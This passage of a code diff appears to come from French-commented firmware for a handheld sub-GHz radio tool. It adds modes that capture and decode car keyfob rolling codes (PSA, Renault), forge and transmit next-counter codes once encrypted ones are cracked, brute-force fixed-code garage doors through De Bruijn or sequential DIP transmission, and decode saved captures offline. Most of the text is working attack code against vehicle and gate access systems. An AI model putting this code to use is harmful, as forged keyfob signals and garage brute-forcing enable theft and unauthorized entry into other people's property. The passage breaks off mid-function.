+                    // Refuse d'emettre une PSA chiffree non crackee (serial=0) ou une Renault V1 non crackee.
+                    bool s_psa = !hist.empty() && hist[sel].protocol && strncmp(hist[sel].protocol, "PSA", 3) == 0;
+                    bool s_rv1 = !hist.empty() && hist[sel].protocol && strstr(hist[sel].protocol, "Renault V1");
+                    bool s_crk = !hist.empty() && hist[sel].protocol && strstr(hist[sel].protocol, "(crack)");
+                    bool s_ok  = !hist.empty() && (s_psa ? (hist[sel].serial != 0)
+                                                         : (s_rv1 ? (bool)s_crk : pp_has_encoder(hist[sel].protocol)));
+                    if ((kp('s') || kp('S')) && s_ok) {
+                        keyRelease(); cc_isr_stop();
+                        SubGhzDecoded e = hist[sel];
+                        int  sel_btn = e.btn & 0x0F;
+                        int  cnt_off = 1;
+                        int  field   = 0;
+                        bool sp_redraw = true;
+                        const char* status = "";
+                        while (true) {
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                            if (kp(';') || kp('.')) { keyRelease(); field ^= 1; sp_redraw = true; delay(120); }
+                            if (kp(',')) { keyRelease();
+                                if (field == 0) sel_btn = (sel_btn - 1) & 0x0F; else cnt_off = max(1, cnt_off - 1);
+                                status = ""; sp_redraw = true; delay(120); }
+                            if (kp('/')) { keyRelease();
+                                if (field == 0) sel_btn = (sel_btn + 1) & 0x0F; else cnt_off = min(255, cnt_off + 1);
+                                status = ""; sp_redraw = true; delay(120); }
+                            if (kp(KEY_ENTER)) { keyRelease();
+                                bool is_fsk = false;
+                                uint32_t tcnt = (uint32_t)e.cnt + cnt_off;
+                                int n = pp_encode_next(e.protocol, e.serial, (uint8_t)sel_btn, tcnt,
+                                                       cc_raw_pulses, CC_MAX_PULSES, &is_fsk);
+                                if (n > 0) {
+                                    // Dump serie des impulsions emises (pour comparer avec une
+                                    // capture ProtoPirate de reference et debug la reconnaissance).
+                                    Serial.printf("[TX] %s btn=%d cnt=0x%X %s %d pulses:",
+                                                  e.protocol, sel_btn, (unsigned)tcnt,
+                                                  is_fsk ? "FSK" : "OOK", n);
+                                    for (int _i = 0; _i < n && _i < 80; _i++) Serial.printf(" %d", cc_raw_pulses[_i]);
+                                    Serial.println();
+                                    // Emet sur la freq + modulation de CAPTURE (x5 comme un vrai fob).
+                                    bool txfsk = cc_tx_on_capture(cc_raw_pulses, n, e, freq_hz, cc_preset_idx, is_fsk, 3);
+                                    status = txfsk ? "Sent x3 (FSK)" : "Sent x3 (OOK)";
+                                } else status = "button n/a";
+                                sp_redraw = true;
+                            }
+                            if (!sp_redraw) { delay(10); continue; }
+                            sp_redraw = false;
+                            sp.fillScreen(TFT_BLACK);
+                            sp.fillRect(0,0,W,14,0x0841); sp.drawFastHLine(0,14,W,0xFC00);
+                            sp.setTextColor(0xFC00,0x0841); sp.setCursor(2,3); sp.print("Send / Resend");
+                            sp.setTextColor(TFT_WHITE,TFT_BLACK);
+                            sp.setCursor(6,20); sp.printf("Proto : %s", e.protocol);
+                            sp.setCursor(6,32); sp.printf("Serial: 0x%08lX", (unsigned long)e.serial);
+                            sp.setTextColor(field==0?TFT_GREEN:TFT_WHITE, field==0?TFT_NAVY:TFT_BLACK);
+                            { const char* _sbn = pp_button_name(e.protocol, (uint8_t)sel_btn);
+                              sp.setCursor(6,48);
+                              if (_sbn) sp.printf(" Button : %d (%s) ", sel_btn, _sbn);
+                              else      sp.printf(" Button : %-3d ", sel_btn); }
+                            sp.setTextColor(field==1?TFT_GREEN:TFT_WHITE, field==1?TFT_NAVY:TFT_BLACK);
+                            sp.setCursor(6,62); sp.printf(" Counter: +%-3d (next 0x%X) ", cnt_off,
+                                                          (unsigned)((e.cnt + cnt_off) & 0xFFFF));
+                            if (status[0]) { sp.setTextColor(TFT_CYAN,TFT_BLACK); sp.setCursor(6,82); sp.print(status); }
+                            sp.fillRect(0,H-14,W,14,0x0841);
+                            sp.setTextColor(0x5AEB,0x0841); sp.setCursor(4,H-12);
+                            sp.print(";. field  ,/ value  ENT=send  BACK");
+                            if (use_sprite) sprite->pushSprite(0,0);
+                        }
+                        cc_apply_preset(cc_preset_idx);
+                        cc_set_raw_rx(); pp_decoders_reset(); cc_isr_start(); last_draw = 0;
+                    }
+
+                    // E = enregistrer la capture en .sub (rejouable via Saved / decodable via Analyze) + log CSV
+                    if ((kp('e') || kp('E')) && !hist.empty()) {
+                        keyRelease();
+                        SD.mkdir("/evil/subghz");
+                        char pn[24]; int pk = 0;
+                        const char* pp = hist[sel].protocol ? hist[sel].protocol : "PP";
+                        for (const char* c = pp; *c && pk < 22; c++) pn[pk++] = (*c == ' ' || *c == '/' || *c == '(' || *c == ')') ? '_' : *c;
+                        pn[pk] = 0;
+                        char fn[80];
+                        snprintf(fn, sizeof(fn), "/evil/subghz/%s_%08lX_%lu.sub", pn, (unsigned long)hist[sel].serial, (unsigned long)millis());
+                        bool is_fsk = false;
+                        int n = pp_encode_next(hist[sel].protocol, hist[sel].serial, hist[sel].btn, hist[sel].cnt, cc_raw_pulses, CC_MAX_PULSES, &is_fsk);
+                        bool ok;
+                        if (n > 0) ok = cc_save_sub(fn, freq_hz, is_fsk ? "2FSKDev238Async" : cc_presets[cc_preset_idx].sub_name, cc_raw_pulses, n);
+                        else       ok = cc_save_sub_key(fn, freq_hz, hist[sel]);
+                        cc_hist_log_sd(hist[sel], freq_hz);
+                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(ok ? TFT_GREEN : TFT_RED, 0x0841);
+                        sp.setCursor(4, H - 12); sp.print(ok ? "Saved .sub + captures.csv" : "Save failed");
+                        if (use_sprite) sprite->pushSprite(0, 0); delay(800); last_draw = 0;
+                    }
+                }
+
+                if (now - last_draw < 200) { delay(1); continue; }
+                last_draw = now;
+
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                sp.setTextSize(1); sp.setTextFont(1);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                sp.printf("PP %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz/1000000.0f);
+                sp.setCursor(W-55, 3); sp.printf("%.0fdBm", cc_get_rssi());
+
+                if (detail && !hist.empty()) {
+                    const SubGhzDecoded& e = hist[sel];
+                    cc_draw_decoded_detail(sp, e);
+                    // Gating action : PSA/Renault chiffres -> K tant que non decrypte ; sinon S.
+                    bool is_psa = e.protocol && strncmp(e.protocol, "PSA", 3) == 0;
+                    bool is_rv1 = e.protocol && strstr(e.protocol, "Renault V1");
+                    bool cracked = e.protocol && strstr(e.protocol, "(crack)");
+                    bool sendable = is_psa ? (e.serial != 0) : (is_rv1 ? (bool)cracked : pp_has_encoder(e.protocol));
+                    bool needK    = is_psa ? (e.serial == 0) : (is_rv1 ? !cracked : false);
+                    // Une seule ligne d'action, sous le corps (plus de chevauchement "Rolling code")
+                    if (needK)         { sp.setTextColor(TFT_ORANGE, TFT_BLACK); sp.setCursor(6, 96); sp.print("K = crack (chiffre)"); }
+                    else if (sendable) { sp.setTextColor(TFT_GREEN,  TFT_BLACK); sp.setCursor(6, 96); sp.print("S = SEND / resend"); }
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(2, 108); sp.printf("#%d/%d vu x%u", sel + 1, (int)hist.size(), hits[sel]);
+                    sp.fillRect(0, H - 14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                    if (needK)         sp.print(";/. K=crack E=save C=cfg BACK");
+                    else if (sendable) sp.print(";/. S=send E=save C=cfg BACK");
+                    else               sp.print(";/. E=save C=cfg BACK");
+                } else {
+                    if (hist.empty()) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(20, 50); sp.print("Waiting for a key...");
+                        sp.setTextColor(0x5AEB, TFT_BLACK);
+                        sp.setCursor(6, 70); sp.printf("%d decoders active", PP_NUM_DECODERS);
+                    } else {
+                        int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
+                        if (sel < listStart) listStart = sel;
+                        if (sel >= listStart + maxVis) listStart = sel - maxVis + 1;
+                        for (int i = 0; i < maxVis && (listStart + i) < (int)hist.size(); i++) {
+                            int idx = listStart + i; const SubGhzDecoded& e = hist[idx];
+                            int y = listY + i * lineH; bool s = (idx == sel);
+                            if (s) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                            else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(4, y + 2);
+                            sp.printf("%-12.12s %05lX", e.protocol ? e.protocol : "?", (unsigned long)(e.serial & 0xFFFFF));
+                            if (hits[idx] > 1) { sp.setCursor(W - 26, y + 2); sp.printf("x%u", hits[idx]); }
+                        }
+                    }
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(2, 108); sp.printf("Edges:%lu Hits:%lu", pp_edges, pp_hits);
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                    sp.print(";/. sel ENT=detail C=config BACK");
+                }
+                if (use_sprite) sprite->pushSprite(0, 0);
+            }
+            cc_set_raw_rx();
+        } else if (mode == 10) {
+            // ── Gates (rolling) : portails/volets — liste navigable + detail + config C ──
+            // Lecture seule (rolling). AM270 par defaut (preset des decodeurs gates).
+            cc_preset_idx = 1; cc_apply_preset(1);
+            cc_set_raw_rx(); cc_isr_start();
+            std::vector<SubGhzDecoded> hist; std::vector<uint16_t> hits;
+            int sel = 0, listStart = 0; bool detail = false, follow = true;
+            std::vector<int> gbuf; gbuf.reserve(768);
+            unsigned long g_last_edge = millis(), last_draw = 0, g_edges = 0, g_hits = 0;
+            const int HMAX = 25;
+            auto push_gate = [&](GateCode& c) {
+                SubGhzDecoded d = {};
+                d.protocol = c.protocol; d.data = c.key; d.bit_count = c.Bit;
+                d.serial = c.serial; d.btn = c.btn; d.cnt = c.cnt; d.is_rolling = true; d.te = c.te;
+                cc_hist_push(hist, hits, d, HMAX, sel, follow && !detail, freq_hz, (uint8_t)cc_preset_idx);
+                cc_hist_log_sd(d, freq_hz); g_hits++;
+            };
+            while (true) {
+                bool level; int32_t dur;
+                while (cc_isr_read(&level, &dur)) {
+                    g_edges++;
+                    if (dur > 60 && dur < 30000) gbuf.push_back(level ? dur : -dur);
+                    g_last_edge = millis();
+                    if (gbuf.size() >= 700) { GateCode c; if (gate_multi_decode(gbuf, c)) push_gate(c); gbuf.clear(); }
+                }
+                if (gbuf.size() >= 40 && (millis() - g_last_edge) > 20) {
+                    GateCode c; if (gate_multi_decode(gbuf, c)) push_gate(c); gbuf.clear();
+                }
+                unsigned long now = millis();
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease();
+                    if (detail) { detail = false; last_draw = 0; } else { cc_isr_stop(); break; } }
+                if (kp('c') || kp('C')) { keyRelease(); cc_isr_stop();
+                    if (cc_config_popup(sp, use_sprite, sprite, W, H, cc_freq_idx, cc_preset_idx)) {
+                        freq_hz = cc_frequencies[cc_freq_idx] * 1000;
+                        cc_set_frequency(freq_hz / 1000000.0f); cc_apply_preset(cc_preset_idx);
+                    }
+                    cc_set_raw_rx(); gbuf.clear(); cc_isr_start(); last_draw = 0;
+                }
+                if (!detail) {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; follow = false; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease();
+                        if (sel < (int)hist.size() - 1) sel++;
+                        if (sel >= (int)hist.size() - 1) follow = true; last_draw = 0; delay(120); }
+                    if (kp(KEY_ENTER) && !hist.empty()) { keyRelease(); detail = true; last_draw = 0; }
+                } else {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease(); if (sel < (int)hist.size() - 1) sel++; last_draw = 0; delay(120); }
+                }
+                if (now - last_draw < 200) { delay(1); continue; }
+                last_draw = now;
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                sp.setTextSize(1); sp.setTextFont(1);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+                sp.printf("Gates %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz / 1000000.0f);
+                sp.setCursor(W - 55, 3); sp.printf("%.0fdBm", cc_get_rssi());
+                if (detail && !hist.empty()) {
+                    cc_draw_decoded_detail(sp, hist[sel]);
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(2, 108); sp.printf("#%d/%d vu x%u", sel + 1, (int)hist.size(), hits[sel]);
+                    sp.fillRect(0, H - 14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                    sp.print(";/. prec/suiv  C=config  BACK");
+                } else {
+                    if (hist.empty()) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(16, 50); sp.print("Waiting for a remote...");
+                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 70); sp.print("Somfy/Nice/SecPlus/Hormann/CAME");
+                    } else {
+                        int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
+                        if (sel < listStart) listStart = sel;
+                        if (sel >= listStart + maxVis) listStart = sel - maxVis + 1;
+                        for (int i = 0; i < maxVis && (listStart + i) < (int)hist.size(); i++) {
+                            int idx = listStart + i; const SubGhzDecoded& e = hist[idx];
+                            int y = listY + i * lineH; bool s = (idx == sel);
+                            if (s) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                            else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(4, y + 2);
+                            sp.printf("%-12.12s %05lX", e.protocol ? e.protocol : "?", (unsigned long)(e.serial & 0xFFFFF));
+                            if (hits[idx] > 1) { sp.setCursor(W - 26, y + 2); sp.printf("x%u", hits[idx]); }
+                        }
+                    }
+                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(2, 108); sp.printf("Edges:%lu Hits:%lu", g_edges, g_hits);
+                    sp.fillRect(0, H - 14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                    sp.print(";/. sel ENT=detail C=config BACK");
+                }
+                if (use_sprite) sprite->pushSprite(0, 0);
+            }
+            cc_set_raw_rx();
+        } else if (mode == 11) {
+            // ── OpenSesame : brute-force codes FIXES de garage (De Bruijn / DIP) ──
+            // Emet TOUS les codes n-bits sur ton propre garage. Pas de jamming.
+            int gp = 0, gstart = 0; int gfi = -1;   // proto, scroll, freq idx (-1 = defaut proto)
+            bool useDeb = true;                      // true=De Bruijn, false=DIP sequentiel
+            int screen = 0;                          // 0 = choix proto, 1 = config/run
+            bool gdraw = true;
+            while (true) {
+                M5.update(); cardUpdate();
+                if (screen == 0) {
+                    if (gdraw) {
+                        int lineH = 18, listY = 20, maxVis = (H - listY - 14) / lineH;
+                        if (gp < gstart) gstart = gp;
+                        if (gp >= gstart + maxVis) gstart = gp - maxVis + 1;
+                        sp.fillScreen(TFT_BLACK);
+                        sp.setTextFont(1); sp.setTextSize(1.5);
+                        sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 2); sp.print("OpenSesame garage");
+                        for (int i = 0; i < maxVis && (gstart + i) < GARAGE_PROTO_COUNT; i++) {
+                            int idx = gstart + i; int y = listY + i * lineH;
+                            if (idx == gp) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                            else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(6, y + 2); sp.print(GARAGE_PROTOS[idx].name);
+                        }
+                        sp.fillRect(0, H - 16, W, 16, 0x0841);
+                        sp.setTextSize(1);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=config BACK");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        gdraw = false;
+                    }
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                    if (kp(';')) { keyRelease(); if (gp > 0) gp--; gdraw = true; delay(120); }
+                    if (kp('.')) { keyRelease(); if (gp < GARAGE_PROTO_COUNT - 1) gp++; gdraw = true; delay(120); }
+                    if (kp(KEY_ENTER)) { keyRelease(); gfi = -1; screen = 1; gdraw = true; }
+                } else {
+                    // Ecran config : freq (,//), mode (TAB), START (ENTER), BACK
+                    const GarageProto& P = GARAGE_PROTOS[gp];
+                    uint32_t fhz = (gfi < 0) ? P.def_hz : GARAGE_FREQS[gfi];
+                    if (gdraw) {
+                        sp.fillScreen(TFT_BLACK);
+                        sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("OpenSesame config");
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                        sp.setCursor(6, 24); sp.printf("Proto : %s", P.name);
+                        sp.setCursor(6, 40); sp.printf("Bits  : %d  (codes=%ld)", P.bits, (long)(1L << P.bits));
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        sp.setCursor(6, 56); sp.printf("Freq  : %.3f MHz", fhz / 1000000.0f);
+                        sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                        sp.setCursor(6, 72); sp.printf("Mode  : %s", useDeb ? "De Bruijn (rapide)" : "DIP (sequentiel)");
+                        sp.setTextColor(0x8410, TFT_BLACK);
+                        sp.setCursor(6, 90); sp.print(",// freq  TAB mode");
+                        sp.fillRect(0, H - 14, W, 14, 0x0841);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("ENT=START  BACK=list");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        gdraw = false;
+                    }
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); screen = 0; gdraw = true; delay(120); }
+                    if (kp(',')) { keyRelease(); int c = (gfi < 0 ? 0 : gfi); gfi = (c + GARAGE_FREQ_COUNT - 1) % GARAGE_FREQ_COUNT; gdraw = true; delay(120); }
+                    if (kp('/')) { keyRelease(); int c = (gfi < 0 ? 0 : gfi); gfi = (c + 1) % GARAGE_FREQ_COUNT; gdraw = true; delay(120); }
+                    if (kp(KEY_TAB)) { keyRelease(); useDeb = !useDeb; gdraw = true; delay(120); }
+                    if (kp(KEY_ENTER)) {
+                        keyRelease();
+                        int n = P.bits;
+                        cc_set_frequency(fhz / 1000000.0f);
+                        cc_apply_preset(0);            // AM650 = OOK/ASK
+                        bool cancelled = false;
+                        if (useDeb) {
+                            // De Bruijn : sequence 2^n+(n-1) symboles -> flux OOK continu
+                            int seqcap = (1 << n) + n + 2;
+                            uint8_t* seq = (uint8_t*)malloc(seqcap);
+                            int32_t* pul = (int32_t*)malloc((size_t)2 * seqcap * sizeof(int32_t));
+                            if (seq && pul) {
+                                int slen = gb_debruijn(n, seq);
+                                int plen = gb_bits_to_pulses(seq, slen, pul, 2 * seqcap);
+                                unsigned long pass = 0, t0 = millis();
+                                while (!cancelled) {
+                                    cc_send_raw(pul, plen, 1);
+                                    pass++;
+                                    sp.fillScreen(TFT_BLACK);
+                                    sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("De Bruijn TX");
+                                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                    sp.setCursor(6, 30); sp.printf("%s", P.name);
+                                    sp.setCursor(6, 46); sp.printf("%.3f MHz  %d sym", fhz / 1000000.0f, slen);
+                                    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                                    sp.setCursor(6, 66); sp.printf("Passes: %lu  (%lus)", pass, (millis() - t0) / 1000);
+                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 92); sp.print("BACK = stop");
+                                    if (use_sprite) sprite->pushSprite(0, 0);
+                                    M5.update(); cardUpdate();
+                                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; }
+                                }
+                            }
+                            free(seq); free(pul);
+                        } else {
+                            // DIP : chaque code 0..2^n-1 emis en trame (x2), petit gap
+                            uint32_t total = (1UL << n);
+                            unsigned long t0 = millis();
+                            for (uint32_t code = 0; code < total && !cancelled; code++) {
+                                int k = gb_code_to_pulses(code, n, cc_raw_pulses, CC_MAX_PULSES);
+                                cc_send_raw(cc_raw_pulses, k, 2);
+                                delayMicroseconds(12000);      // gap inter-trame ~12ms
+                                if ((code & 0x1F) == 0) {
+                                    int pct = (int)((uint64_t)code * 100 / total);
+                                    sp.fillScreen(TFT_BLACK);
+                                    sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DIP brute TX");
+                                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                    sp.setCursor(6, 30); sp.printf("%s", P.name);
+                                    sp.setCursor(6, 46); sp.printf("%.3f MHz", fhz / 1000000.0f);
+                                    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                                    sp.setCursor(6, 62); sp.printf("%lu / %lu (%d%%)", (unsigned long)code, (unsigned long)total, pct);
+                                    sp.drawRect(10, 78, W - 20, 12, TFT_WHITE);
+                                    int bw = (int)((W - 22) * (pct / 100.0f)); if (bw > 0) sp.fillRect(11, 79, bw, 10, TFT_GREEN);
+                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 100); sp.print("BACK = stop");
+                                    if (use_sprite) sprite->pushSprite(0, 0);
+                                    M5.update(); cardUpdate();
+                                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; }
+                                }
+                            }
+                        }
+                        cc_set_raw_rx();
+                        gdraw = true;
+                    }
+                }
+                delay(5);
+            }
+            cc_set_raw_rx();
+        } else if (mode == 12) {
+            // ── Analyze : decode un RAW .sub de la SD a travers TOUS les decodeurs
+            //    (comme en Read live, mais offline) -> liste/detail, renvoi/save. ──
+            File adir = SD.open("/evil/subghz");
+            String afiles[40]; int afc = 0;
+            if (adir) {
+                while (File e = adir.openNextFile()) {
+                    if (!e.isDirectory()) { String nm = e.name(); if (nm.endsWith(".sub") && afc < 40) afiles[afc++] = String("/evil/subghz/") + nm; }
+                    e.close();
+                }
+                adir.close();
+            }
+            if (afc == 0) {
+                sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 55); sp.print("No .sub in /evil/subghz");
+                if (use_sprite) sprite->pushSprite(0, 0); delay(1800);
+            } else {
+                int fsel = 0, fstart = 0; bool fdraw = true;
+                while (true) {
+                    if (fdraw) {
+                        int lineH = 16, listY = 20, maxVis = (H - listY - 14) / lineH;
+                        if (fsel < fstart) fstart = fsel;
+                        if (fsel >= fstart + maxVis) fstart = fsel - maxVis + 1;
+                        sp.fillScreen(TFT_BLACK); sp.setTextFont(1); sp.setTextSize(1.5);
+                        sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 2); sp.printf("Analyze (%d)", afc);
+                        for (int i = 0; i < maxVis && (fstart + i) < afc; i++) {
+                            int idx = fstart + i; int y = listY + i * lineH;
+                            if (idx == fsel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                            else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            String fn = afiles[idx].substring(afiles[idx].lastIndexOf('/') + 1);
+                            if (fn.length() > 22) fn = fn.substring(0, 22);
+                            sp.setCursor(6, y + 1); sp.print(fn);
+                        }
+                        sp.setTextSize(1); sp.fillRect(0, H - 14, W, 14, 0x0841);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=decode BACK");
+                        if (use_sprite) sprite->pushSprite(0, 0); fdraw = false;
+                    }
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                    if (kp(';')) { keyRelease(); if (fsel > 0) fsel--; fdraw = true; delay(120); }
+                    if (kp('.')) { keyRelease(); if (fsel < afc - 1) fsel++; fdraw = true; delay(120); }
+                    if (kp(KEY_ENTER)) {
+                        keyRelease();
+                        uint32_t fhz = 433920000; int cnt = 0;
+                        int32_t* pul = cc_load_sub_malloc(afiles[fsel].c_str(), &fhz, &cnt);
+                        std::vector<SubGhzDecoded> hist; std::vector<uint16_t> hits; int sel = 0;
+                        if (pul && cnt > 0) {
+                            cc_decoders_reset(); pp_decoders_reset();
+                            std::vector<int> gb; gb.reserve(768);
+                            for (int i = 0; i < cnt; i++) {
+                                bool lvl = pul[i] > 0; int32_t dur = pul[i] > 0 ? pul[i] : -pul[i];
+                                SubGhzDecoded d = {};
+                                if (cc_decoders_feed(lvl, dur, d)) cc_hist_push(hist, hits, d, 40, sel, false, fhz, (uint8_t)cc_preset_idx);
+                                SubGhzDecoded pd = {};
+                                if (pp_decoders_feed(lvl, dur, pd)) cc_hist_push(hist, hits, pd, 40, sel, false, fhz, (uint8_t)cc_preset_idx);
+                                if (dur > 60 && dur < 30000) {
+                                    gb.push_back(pul[i]);
+                                    if (gb.size() >= 700) { GateCode g; if (gate_multi_decode(gb, g)) { SubGhzDecoded gd = {}; gd.protocol = g.protocol; gd.data = g.key; gd.bit_count = g.Bit; gd.serial = g.serial; gd.btn = g.btn; gd.cnt = g.cnt; gd.is_rolling = true; gd.te = g.te; cc_hist_push(hist, hits, gd, 40, sel, false, fhz, (uint8_t)cc_preset_idx); } gb.clear(); }
+                                }
+                            }
+                            { GateCode g; if (gate_multi_decode(gb, g)) { SubGhzDecoded gd = {}; gd.protocol = g.protocol; gd.data = g.key; gd.bit_count = g.Bit; gd.serial = g.serial; gd.btn = g.btn; gd.cnt = g.cnt; gd.is_rolling = true; gd.te = g.te; cc_hist_push(hist, hits, gd, 40, sel, false, fhz, (uint8_t)cc_preset_idx); } }
+                        }
+                        free(pul);
+                        // Vue resultats : liste / detail
+                        int lstart = 0; bool detail = false; bool ldraw = true;
+                        while (true) {
+                            if (ldraw) {
+                                sp.fillScreen(TFT_BLACK); sp.setTextFont(1); sp.setTextSize(1);
+                                sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.printf("Analyze %.3fMHz", fhz / 1000000.0f);
+                                if (hist.empty()) {
+                                    sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, 50); sp.print("No protocol decoded");
+                                    sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 66); sp.print("(RAW non reconnu)");
+                                    sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK");
+                                } else if (detail) {
+                                    cc_draw_decoded_detail(sp, hist[sel]);
+                                    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK); sp.setCursor(2, 108); sp.printf("#%d/%d", sel + 1, (int)hist.size());
+                                    sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                                    sp.print(pp_has_encoder(hist[sel].protocol) ? ";/. S=send E=save BACK" : ";/. E=save BACK");
+                                } else {
+                                    int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
+                                    if (sel < lstart) lstart = sel;
+                                    if (sel >= lstart + maxVis) lstart = sel - maxVis + 1;
+                                    for (int i = 0; i < maxVis && (lstart + i) < (int)hist.size(); i++) {
+                                        int idx = lstart + i; const SubGhzDecoded& e = hist[idx]; int y = listY + i * lineH; bool s = (idx == sel);
+                                        if (s) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); } else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                                        uint64_t mask = e.data & (e.bit_count < 64 ? ((1ULL << e.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+                                        sp.setCursor(4, y + 2); sp.printf("%-11.11s %llX", e.protocol ? e.protocol : "?", (unsigned long long)mask);
+                                    }
+                                    sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=detail BACK");
+                                }
+                                if (use_sprite) sprite->pushSprite(0, 0); ldraw = false;
+                            }
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); if (detail) { detail = false; ldraw = true; } else break; }
+                            if (!hist.empty() && !detail) {
+                                if (kp(';')) { keyRelease(); if (sel > 0) sel--; ldraw = true; delay(120); }
+                                if (kp('.')) { keyRelease(); if (sel < (int)hist.size() - 1) sel++; ldraw = true; delay(120); }
+                                if (kp(KEY_ENTER)) { keyRelease(); detail = true; ldraw = true; }
+                            } else if (!hist.empty() && detail) {
+                                if (kp(';')) { keyRelease(); if (sel > 0) sel--; ldraw = true; delay(120); }
+                                if (kp('.')) { keyRelease(); if (sel < (int)hist.size() - 1) sel++; ldraw = true; delay(120); }
+                                if ((kp('s') || kp('S')) && pp_has_encoder(hist[sel].protocol)) {
+                                    keyRelease();
